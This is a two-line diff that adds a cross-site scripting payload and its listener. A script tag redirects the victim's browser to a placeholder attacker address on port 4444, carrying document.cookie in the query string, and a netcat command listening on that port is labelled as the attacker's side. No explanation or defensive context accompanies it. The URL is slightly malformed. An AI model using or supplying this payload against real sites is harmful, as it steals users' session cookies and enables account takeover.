@@ -1,0 +1,2 @@
+payload: <script>document.location='http:///<IP>:4444/XSS/grabber.php?c='+document.cookie</script>
+Attacker: nc -lvnp 4444
